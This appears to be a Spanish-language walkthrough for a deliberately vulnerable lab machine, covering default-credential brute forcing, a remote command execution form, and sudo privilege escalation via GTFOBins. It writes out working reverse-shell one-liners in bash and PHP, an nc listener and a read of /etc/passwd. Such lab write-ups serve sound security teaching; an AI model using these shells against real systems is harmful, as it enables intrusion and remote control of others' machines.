1. Vulnerabilidad en el login: 

	El administrador a añadido a la base de datos usuarios por defecto que fácilmente se pueden encontrar en un diccionario.
	En concreto se ha utilizado las credenciales de las listas “mysql-betterdefaultpasslist.txt” y “postgres-betterdefaultpasslist.txt” de “Seclist”
	en la ubicación “SecLists/Passwords/Default-Credentials”. También se puede encontrar en el proyecto en “assets/listas/usuarioyPass.txt”. 

	Con un simple ataque de diccionario con alguna herramienta como “Burpsuite” y estas listas se consigue acceder fácilmente.


2. Vulnerabilidad de ejecución de comandos: 

	Estamos ante un sencillo caso de Ejecución de Comandos Remotos (Remote Command Execution, RCE). Podemos 
	ver un formulario en el que nos solicita un comando a ejecutar, y como podemos comprobar con un simple
	"cat /etc/passwd" ejecuta dicho comando. 

	Lo primero que se nos ocurre es lanzar una shell reversa con bash y ponernos en escucha con nc:

	bash -i >& /dev/tcp/172.17.0.1/4444 0>&1

	nc -lnvp 4444

	Pero esto no nos sirve ya que www-data ejecuta la shell /bin/sh y no es compatible con esa sintaxis. Tenemos otra alternativa, 
	lanzar una shell a través de otra aplicación y la que sabemos que está instalada es "php".

	php -r '$sock=fsockopen("172.17.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'


3. Vulnerabilidad para la elevación: 

	Ejecutando el comando “sudo -l” Nos aparecerá un archivo con permisos de sudo “ALL ALL=(ALL) NOPASSWD: #archivo#” siendo “#archivo#”
	el archivo con permisos de sudo.

	El archivo será uno recogido en la lista de “GTFOBins” (https://gtfobins.github.io/) en esa página se detalla como explotar la vulnerabilidad para cada caso.
